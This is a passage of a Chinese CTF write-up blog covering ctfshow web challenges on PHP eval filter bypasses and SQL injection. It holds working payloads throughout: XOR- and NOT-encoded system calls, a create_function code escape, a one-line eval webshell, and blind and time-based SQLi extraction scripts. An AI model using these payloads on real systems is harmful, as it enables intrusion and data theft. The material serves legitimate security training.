(String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; check($v3))&#123;        if(preg_match(&#39;&#x2F;^\W+$&#x2F;&#39;, $v2))&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;function check($str)&#123;    return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false;&#125;</code></pre><p>v2和v3换换顺序</p><pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v3&#x3D;2&amp;v2&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)</code></pre><h2 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;                die(&#39;get out hacker!&#39;);        &#125;        else&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>可以用取反，然后利用三目运算来替代过滤了的加减乘除</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F):</code></pre><p>这里我本来想的是利用或运算的，但是发现或运算不同于异或和取反，它必须将|两边用引号引起来（不过单引号也行，当时只试了双引号</p><h2 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h2><pre class="language-php" data-language="php"><code class="language-php">highlight_file(__FILE__);if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123;    $v1 &#x3D; (String)$_GET[&#39;v1&#39;];    $v2 &#x3D; (String)$_GET[&#39;v2&#39;];    $v3 &#x3D; (String)$_GET[&#39;v3&#39;];    if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123;        if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\&#x2F;|\^|\#|\&quot;&#x2F;i&#39;, $v3))&#123;                die(&#39;get out hacker!&#39;);        &#125;        else&#123;            $code &#x3D;  eval(&quot;return $v1$v3$v2;&quot;);            echo &quot;$v1$v3$v2 &#x3D; &quot;.$code;        &#125;    &#125;&#125;</code></pre><p>:也被过滤了，三目运算符用不了了，但是可以用或符号</p><pre class="language-php" data-language="php"><code class="language-php">?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;|(&#39;%13%19%13%14%05%0d&#39;|&#39;%60%60%60%60%60%60&#39;)(&#39;%0c%13&#39;|&#39;%60%60&#39;)|</code></pre><h2 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phphighlight_file(__FILE__);if(isset($_POST[&#39;ctf&#39;]))&#123;    $ctfshow &#x3D; $_POST[&#39;ctf&#39;];    if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123;        $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]);    &#125;&#125;</code></pre><p>一道creat_function构造匿名函数的rce</p><p><a href="https://paper.seebug.org/94/">https://paper.seebug.org/94/</a></p><p><strong>在PHP的命名空间默认为<code>\</code>，所有的函数和类都在<code>\</code>这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。</strong></p><p><code>create_function</code>来完成，<code>create_function</code>的第一个参数是参数，第二个参数是内容。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507223054651.png" alt="image-20220507223054651"></p><p>所以我们可以构造payload</p><pre class="language-php" data-language="php"><code class="language-php">get:return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;post:ctf&#x3D;\create_function</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507223426477.png" alt="image-20220507223426477"></p><p>这个时候creat_function的结构类似</p><pre class="language-php" data-language="php"><code class="language-php">function a()&#123;return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;&#125;</code></pre><p>我们的命令成功逃逸了</p><h2 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpinclude &#39;flag.php&#39;;if(isset($_GET[&#39;code&#39;]))&#123;    $code&#x3D;$_GET[&#39;code&#39;];    if(preg_match(&quot;&#x2F;[A-Za-z0-9_\%\\|\~\&#39;\,\.\:\@\&amp;\*\+\- ]+&#x2F;&quot;,$code))&#123;        die(&quot;error&quot;);    &#125;    @eval($code);&#125;else&#123;    highlight_file(__FILE__);&#125;function get_ctfshow_fl0g()&#123;    echo file_get_contents(&quot;flag.php&quot;);&#125;</code></pre><p>没过滤^可以直接异或</p><pre class="language-php" data-language="php"><code class="language-php">(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;^&quot;%60%60&quot;);</code></pre><p>预期解是是使用中文</p><p> ?code=$哈=&quot;<code>&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* </code></p><p><code>&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; </code>异或出来的结果是 _GET</p><p>感觉多少有点抽象了</p><h2 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?phperror_reporting(0);highlight_file(__FILE__);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]);$files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123;    if(is_file($file))&#123;        if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123;            unlink($file);        &#125;    &#125;&#125;</code></pre><p>把除了index.php的文件全删了，看起来是文件竞争</p><p>但是有非预期，直接利用file_put_contents往index.php里写马就行</p><p>payload</p><pre class="language-php" data-language="php"><code class="language-php">get:ctf&#x3D;index.phppost:show&#x3D;&lt;?php eval($_GET[1]);?&gt;</code></pre><p>然后访问index.php执行命令</p><h2 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h2><pre class="language-php" data-language="php"><code class="language-php">&lt;?php&#x2F;*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:   2020-10-13 11:25:09# @Last Modified by:   h1xa# @Last Modified time: 2020-10-19 07:12:57*&#x2F;include(&quot;flag.php&quot;);error_reporting(0);highlight_file(__FILE__);class CTFSHOW&#123;    private $username;    private $password;    private $vip;    private $secret;    function __construct()&#123;        $this-&gt;vip &#x3D; 0;        $this-&gt;secret &#x3D; $flag;    &#125;    function __destruct()&#123;        echo $this-&gt;secret;    &#125;    public function isVIP()&#123;        return $this-&gt;vip?TRUE:FALSE;        &#125;    &#125;    function __autoload($class)&#123;        if(isset($class))&#123;            $class();    &#125;&#125;#过滤字符$key &#x3D; $_SERVER[&#39;QUERY_STRING&#39;];if(preg_match(&#39;&#x2F;\_| |\[|\]|\?&#x2F;&#39;, $key))&#123;    die(&quot;error&quot;);&#125;$ctf &#x3D; $_POST[&#39;ctf&#39;];extract($_GET);if(class_exists($__CTFSHOW__))&#123;    echo &quot;class is exists!&quot;;&#125;if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123;    include($ctf);&#125;</code></pre><p>利用extract变量覆盖让isVIP=1</p><p>日志写马</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220507225345310.png" alt="image-20220507225345310"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="web171"><a href="#web171" class="headerlink" title="web171"></a>web171</h2><p>题目给了查询语句</p><pre class="language-sql" data-language="sql"><code class="language-sql">$sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;;</code></pre><p>字符型注入，利用单引号闭合</p><p>联合注入</p><p>三个字段</p><p>查库，查表，查列名，查字段</p><p>payload（之后差不多的查询语句就写一个最终的payload就够了</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select database(),2,3--+ &#x2F;&#x2F;查库-1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+  &#x2F;&#x2F;查表-1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+ &#x2F;&#x2F;查列名-1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user --+  &#x2F;&#x2F;最终payload</code></pre><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a>web172</h2><h3 id="select模块无过滤注入1"><a href="#select模块无过滤注入1" class="headerlink" title="select模块无过滤注入1"></a>select模块无过滤注入1</h3><p>//这个不就是web171吗（</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user2 --+ </code></pre><h3 id="select模块无过滤注入2"><a href="#select模块无过滤注入2" class="headerlink" title="select模块无过滤注入2"></a>select模块无过滤注入2</h3><p>少了一列，方法还是一样的</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(username,password),3 from ctfshow_user2 --+</code></pre><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a>web173</h2><p>这里除了常规的sql语句外还有个过滤，其实172的无过滤注入2就有这个过滤，就是不知道为什么还是注出来了</p><pre class="language-php" data-language="php"><code class="language-php">if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;&#125;</code></pre><p>查询到的内容不能有flag这个字符串，简单一点就是不查username列，直接看password就行。或者用to_base64()来对username进行编码</p><p>最终payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select group_concat(id,to_base64(username),password),2,3 from ctfshow_user3 --+ </code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509172125292.png" alt="image-20220509172125292"></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a>web174</h2><pre class="language-none"><code class="language-none">&#x2F;&#x2F;检查结果是否有flag    if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;    &#125;</code></pre><p>不光过滤了flag，还过滤了数字，盲注看起来是最好的选择了，看大部分的wp也都是盲注</p><pre class="language-python" data-language="python"><code class="language-python"># @Author:Y4tackerimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show&#x2F;api&#x2F;v4.php?id&#x3D;1&#39; and &quot;result &#x3D; &#39;&#39;i &#x3D; 0while True:    i &#x3D; i + 1    head &#x3D; 32    tail &#x3D; 127    while head &lt; tail:        mid &#x3D; (head + tail) &gt;&gt; 1        payload &#x3D; f&#39;1&#x3D;if(ascii(substr((select  password from ctfshow_user4 limit 24,1),&#123;i&#125;,1))&gt;&#123;mid&#125;,1,0) -- -&#39;        r &#x3D; requests.get(url + payload)        if &quot;admin&quot; in r.text:            head &#x3D; mid + 1        else:            tail &#x3D; mid    if head !&#x3D; 32:        result +&#x3D; chr(head)    else:        break    print(result)</code></pre><pre class="language-python" data-language="python"><code class="language-python"># by macchiatoimport requestsimport stringflag &#x3D; &#39;&#39;table &#x3D; string.digits + string.ascii_letters + &#39;-&#123;&#125;&#39;for i in range(1, 45):    for j in table:        url &#x3D; &quot;http:&#x2F;&#x2F;dcfd2cf7-1f37-408e-a4d1-c834d09ac388.chall.ctf.show&#x2F;&#x2F;api&#x2F;v4.php?id&#x3D;&quot;        payload &#x3D; &#39;&#39;&#39;1&#39; and substr((select password from ctfshow_user4 where username&#x3D;&quot;flag&quot;),&#123;&#125;,1)&#x3D;&quot;&#123;&#125;&quot;--+&#39;&#39;&#39;.format(i,j)        r &#x3D; requests.get(url + payload)        if &quot;admin&quot; in r.text:            flag +&#x3D; j            print(flag)            break</code></pre><p>我这里就不跑了，直接贴脚本。</p><p>还有一种是将数字替换为字母</p><p>但本来的flag中一定也会有一些小写字母，这样的话就没办法分辨那个是原本的字母哪个是替换出来的。</p><p>所以为了避免这个问题，将password首先hex一下，因为hex()函数的返回值中字母都是大写的，所以我们返回结果中的小写字母就是原来的数字，而大写字母就是原本的字符。</p><p>这个虽然说比较麻烦，但也是一种很好的解题思路。</p><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39; union select &#39;q&#39;,(select replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(hex(password),&#39;1&#39;,&#39;q&#39;),&#39;2&#39;,&#39;w&#39;),&#39;3&#39;,&#39;e&#39;),&#39;4&#39;,&#39;r&#39;),&#39;5&#39;,&#39;t&#39;),&#39;6&#39;,&#39;y&#39;),&#39;7&#39;,&#39;u&#39;),&#39;8&#39;,&#39;i&#39;),&#39;9&#39;,&#39;o&#39;),&#39;0&#39;,&#39;p&#39;) from ctfshow_user4 where username&#x3D;&#39;flag&#39;)--+</code></pre><h2 id="web175"><a href="#web175" class="headerlink" title="web175"></a>web175</h2><pre class="language-php" data-language="php"><code class="language-php">&#x2F;&#x2F;检查结果是否有flag    if(!preg_match(&#39;&#x2F;[\x00-\x7f]&#x2F;i&#39;, json_encode($ret)))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;;    &#125;</code></pre><p>把字符全ban了</p><p>不能通过回显来布尔盲注了，可以利用时间盲注</p><pre class="language-python" data-language="python"><code class="language-python">import timeimport requestsurl &#x3D; &#39;http:&#x2F;&#x2F;5adcc7d3-c4d3-440a-8f3e-a4b93e6b61e4.challenge.ctf.show&#x2F;api&#x2F;v5.php&#39;flag &#x3D; &#39;&#39;for i in range(60):    lenth &#x3D; len(flag)    min,max &#x3D; 32,128    while True:        j &#x3D; min + (max-min)&#x2F;&#x2F;2        if(min &#x3D;&#x3D; j):            flag +&#x3D; chr(j)            print(flag)            break        payload &#x3D; f&quot;?id&#x3D;&#39; union select &#39;a&#39;,if(ascii(substr((select group_concat(password) from ctfshow_user5 where username&#x3D;&#39;flag&#39;),&#123;i&#125;,1))&lt;&#123;j&#125;,sleep(0.5),&#39;False&#39;) --+&quot;        start_time &#x3D; time.time()        r &#x3D; requests.get(url&#x3D;url+payload).text        end_time &#x3D; time.time()        sub &#x3D; end_time - start_time        if(sub &gt;&#x3D; 0.5):            max &#x3D; j        else:            min &#x3D; j</code></pre><p>还可以用<code>into outfile</code>和<code>dumpfile</code>来写shell</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+-1&#39; union select username,password from ctfshow_user5 where username&#x3D;&#39;flag&#39; into dumpfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.txt&#39; --+</code></pre><h2 id="web176"><a href="#web176" class="headerlink" title="web176"></a>web176</h2><p>试了一下，是过滤了小写的select，变个大写字母就行</p><pre class="language-sql" data-language="sql"><code class="language-sql">id&#x3D;-1&#39; union Select group_concat(column_name),2,3  from information_schema.columns where table_name&#x3D;&#39;ctfshow_user&#39;--+ &#x2F;&#x2F;查列最终payload-1&#39; union Select group_concat(id,username,password),2,3  from ctfshow_user--+ </code></pre><h2 id="web177"><a href="#web177" class="headerlink" title="web177"></a>web177</h2><p>过滤了空格，-，+，#，，or，空格可以用/**/绕过注释可以用#的url编码%23，or可以用||替代</p><p>因为没有过滤，所以直接万能密码就能出</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;||1%23</code></pre><p>正经注入的话差不多就是这样</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,password&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23</code></pre><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a>web178</h2><p>我有点看不懂这个过滤了</p><p>为什么1‘or1%23不行1’||1%23可以，1‘or(1)%23可以，1’or(1=1)%23可以呢</p><p>or后边跟的一定要存在空格吗,是我记错了吗。。。</p><p>这个过滤了空格，*，那么用/**/当空格是不行的，但是可以用%09 %0a %0d  %0c  +之类的替代空格，或者利用括号</p><p>正经的注入的话</p><p>payload</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union%09select%091,2,password%09from%09ctfshow_user%23</code></pre><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a>web179</h2><pre class="language-sql" data-language="sql"><code class="language-sql">1&#39;||1&#x3D;1%23</code></pre><p>万能密码还是可以</p><p>或者利用%0c代替空格</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union%0cselect%0c1,2,password%0cfrom%0cctfshow_user%23</code></pre><p>或者空格</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;union(select(1),2,(password)from(ctfshow_user))%23</code></pre><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a>web180</h2><p>%23也被过滤了，但是%0c还能用，-也能用，所以我们可以用</p><p>--%0c来代替--+的空格，只要把上一题的用来注释的%23改成--%0c就行了</p><p>或者不要注释符让后面的单引号能够闭合</p><p>比如</p><pre class="language-sql" data-language="sql"><code class="language-sql">-1&#39;%0cunion%0cselect&#39;1&#39;,(select%0cgroup_concat(password)from&#96;ctfshow_user&#96;),&#39;3</code></pre><p>或者这种</p><p>1111&#39;or(id=26)and&#39;a&#39;=&#39;a</p><p>因为sql中and优先级高于or所以就会变成</p><pre class="language-none"><code class="language-none">(username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;11&#39;) or (id&#x3D;26and&#39;a&#39;&#x3D;&#39;a&#39;)</code></pre><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a>web181</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;  return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select&#x2F;i&#39;, $str);&#125;</code></pre><p>给了waf函数的内容</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509204736531.png" alt="image-20220509204736531"></p><p>不要注释直接闭合，然后利用id查出flag</p><p>常规的注入在这种没注释符的情况下一般都是用</p><p>’1’=&#39;1来替代了%23</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a>web182</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;  return preg_match(&#39;&#x2F; |\*|\x09|\x0a|\x0b|\x0c|\x00|\x0d|\xa0|\x23|\#|file|into|select|flag&#x2F;i&#39;, $str);&#125;</code></pre><p>同样是利用or和and的优先级问题，利用id查出flag</p><p>1111&#39;or(id=26)and&#39;a&#39;=&#39;a</p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a>web183</h2><p>改成post方式了</p><p>等于和select被过滤了，看起来只能利用like进行盲注了</p><pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;(ctfshow_user)where(pass)like&#39;ctfshow&#123;%&#39;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509211946454.png" alt="image-20220509211946454"></p><p>返回为1，说明确实有这个字段，然后就是利用盲注了</p><p>偷一下南方师傅的脚本</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;8 21:24# blog: www.wlhhlc.topimport requestsurl &#x3D; &quot;http:&#x2F;&#x2F;adb1f64a-e1fd-4640-aeb5-b49da1a62390.challenge.ctf.show:8080&#x2F;select-waf.php&quot;str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;flag &#x3D; &quot;ctfshow&quot;for i in range(0,666):    for j in str:        data &#x3D; &#123;&quot;tableName&quot;:&quot;(ctfshow_user)where(pass)like&#39;&#123;0&#125;%&#39;&quot;.format(flag+j)&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;$user_count &#x3D; 1&quot; in res.text:            flag +&#x3D; j            print(flag)            if j&#x3D;&#x3D;&quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a>web184</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125;</code></pre><p>过滤的确实有点多</p><p>这里连where也过滤了，可以利用right join，右连接的方式查表</p><p><a href="https://blog.csdn.net/weixin_48083470/article/details/119043137">https://blog.csdn.net/weixin_48083470/article/details/119043137</a></p><p>利用十六进制来绕过最后的引号，字段猜测和上个题一样在pass里</p><pre class="language-sql" data-language="sql"><code class="language-sql">tableName&#x3D;ctfshow_user as a right join ctfshow_user as b on b.pass like 0x63746673686f7725</code></pre><p>可以看到有返回值，所以就可以上脚本跑了</p><p>再偷一下南方师傅的脚本</p><pre class="language-python" data-language="python"><code class="language-python">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;8 21:24# blog: www.wlhhlc.topimport requestsimport binasciidef to_hex(s):    # 字符串转16进制    str_16 &#x3D; binascii.b2a_hex(s.encode(&#39;utf-8&#39;))      str_16 &#x3D; bytes.decode(str_16)    res &#x3D; str_16.replace(&quot;b&#39;&quot;,&quot;&quot;).replace(&quot;&#39;&quot;,&quot;&quot;)    return resurl &#x3D; &quot;http:&#x2F;&#x2F;4d223a13-c7d6-4213-9c81-d388a5c26634.challenge.ctf.show:8080&#x2F;select-waf.php&quot;str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;flag &#x3D; &quot;ctfshow&quot;for i in range(0,666):    for j in str:        result &#x3D; &quot;0x&quot; + to_hex(flag + j + &quot;%&quot;)        data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like &#123;0&#125;&quot;.format(result)&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;$user_count &#x3D; 43&quot; in res.text:            flag +&#x3D; j            print(flag)            if j&#x3D;&#x3D;&quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web185"><a href="#web185" class="headerlink" title="web185"></a>web185</h2><pre class="language-php" data-language="php"><code class="language-php">function waf($str)&#123;   return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str); &#125;</code></pre><p>这个waf，把数字也全ban了，那就不能用十六进制了，但是引号一样被ban了</p><p>放张图</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/20201127190309995.png" alt="在这里插入图片描述"></p><p>再偷一个南方师傅的脚本</p><p>这里主要是利用了mysql里true=1 true+true=2的特性，硬加true让数值等于我们要的字母的ASCII码值，然后在外面套个chr转化为字符，再利用concat进行拼接</p><pre class="language-none"><code class="language-none">#-- coding:UTF-8 --# Author:dota_st# Date:2021&#x2F;4&#x2F;8 21:24# blog: www.wlhhlc.topimport requestsdef createNum(n):    str &#x3D; &#39;true&#39;    if n &#x3D;&#x3D; 1:        return &#39;true&#39;    else:        for i in range(n - 1):            str +&#x3D; &quot;+true&quot;    return str#把每一个字符转换成ascii码对应的数值def change_str(s):    str&#x3D;&quot;&quot;    str+&#x3D;&quot;chr(&quot;+createNum(ord(s[0]))+&quot;)&quot;    for i in s[1:]:        str+&#x3D;&quot;,chr(&quot;+createNum(ord(i))+&quot;)&quot;    return strurl &#x3D; &quot;http:&#x2F;&#x2F;c0323dfb-fa55-4925-9c61-2e4b8c64e835.challenge.ctf.show:8080&#x2F;select-waf.php&quot;str &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyz&#123;&#125;-&quot;flag &#x3D; &quot;ctfshow&quot;for i in range(0,666):    for j in str:        result &#x3D; change_str(flag + j + &quot;%&quot;)        data &#x3D; &#123;&quot;tableName&quot;:&quot;ctfshow_user as a right join ctfshow_user as b on b.pass like(concat(&#123;0&#125;))&quot;.format(result)&#125;        res &#x3D; requests.post(url&#x3D;url, data&#x3D;data)        if &quot;$user_count &#x3D; 43;&quot; in res.text:            flag +&#x3D; j            print(flag)            if j&#x3D;&#x3D;&quot;&#125;&quot;:                exit()            break</code></pre><h2 id="web186"><a href="#web186" class="headerlink" title="web186"></a>web186</h2><pre class="language-none"><code class="language-none">function waf($str)&#123;  return preg_match(&#39;&#x2F;\*|\x09|\x0a|\x0b|\x0c|\0x0d|\xa0|\%|\&lt;|\&gt;|\^|\x00|\#|\x23|[0-9]|file|\&#x3D;|or|\x7c|select|and|flag|into|where|\x26|\&#39;|\&quot;|union|\&#96;|sleep|benchmark&#x2F;i&#39;, $str);&#125;</code></pre><p>虽然多加了几个，但是上一题的脚本可以接着用</p><h2 id="web187"><a href="#web187" class="headerlink" title="web187"></a>web187</h2><p>是登录页面，要求以admin的账户登录，但是对username的验证没法绕过，只能利用password的部分</p><p>查询语句</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;拼接sql语句查找指定ID用户  $sql &#x3D; &quot;select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;$password&#39;&quot;;      </code></pre><p>返回逻辑</p><pre class="language-none"><code class="language-none">$username &#x3D; $_POST[&#39;username&#39;];$password &#x3D; md5($_POST[&#39;password&#39;],true);&#x2F;&#x2F;只有admin可以获得flagif($username!&#x3D;&#39;admin&#39;)&#123;    $ret[&#39;msg&#39;]&#x3D;&#39;用户名不存在&#39;;    die(json_encode($ret));&#125;  </code></pre><p>可以看到这里的password是md5的形式，而这里存在一个很特殊的字符串ffifdyop</p><pre class="language-none"><code class="language-none">md5(&quot;ffifdyop&quot;,true) &#x3D; &#39;or&#39;6]!r,b</code></pre><p>将这个放在密码里，整个查询语句就会被闭合</p><pre class="language-none"><code class="language-none">select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D;&#39;&#39;or&#39;6]!r,b&#39;也就是：select count(*) from ctfshow_user where username &#x3D; &#39;$username&#39; and password&#x3D; &#39;&#39;or &#39;6]!r,b&#39;也就是：select count(*) from ctfshow_user where FALSE or TRUEor的存在配合后面的TRUE就绕过了</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220509221244579.png" alt="image-20220509221244579"></p><h2 id="web188"><a href="#web188" class="headerlink" title="web188"></a>web188</h2><pre class="language-none"><code class="language-none"> $sql &#x3D; &quot;select pass from ctfshow_user where username &#x3D; &#123;$username&#125;&quot;;&#x2F;&#x2F;密码判断  if($row[&#39;pass&#39;]&#x3D;&#x3D;intval($password))&#123;      $ret[&#39;msg&#39;]&#x3D;&#39;登陆成功&#39;;      array_push($ret[&#39;data&#39;], array(&#39;flag&#39;&#x3D;&gt;$flag));    &#125;</code></pre><p>在where username=0这样的查询中，因为username都会是字符串，在mysql中字符串与数字进行比较的时候，以字母开头的字符串都会转换成数字0，因此这个where可以把所有以字母开头的数据查出来</p><p>而if($row[‘pass’]==intval($password)) 也是弱比较，查出来的也是字母开头的</p><p>所以payload为</p><pre class="language-sql" data-language="sql"><code class="language-sql">username&#x3D;0&amp;password&#x3D;0</code></pre><p>但注意，如果有某个数据不是以字母开头，是匹配不成功的，这种情况怎么办，我们可以用<code>||</code>运算符</p><pre class="language-none"><code class="language-none">username&#x3D;1||1&amp;password&#x3D;0</code></pre><h2 id="web189"><a href="#web189" class="headerlink" title="web189"></a>web189</h2><p>先试一下上一题的payload，发现没成功，估计是数字开头的了，而题目提示flag在api/index.php里感觉就是利用load_file读文件了</p><p>load_file()，用法一般是select load_file(xxxx)</p><pre class="language-none"><code class="language-none">LOAD_FILE(file_name)： 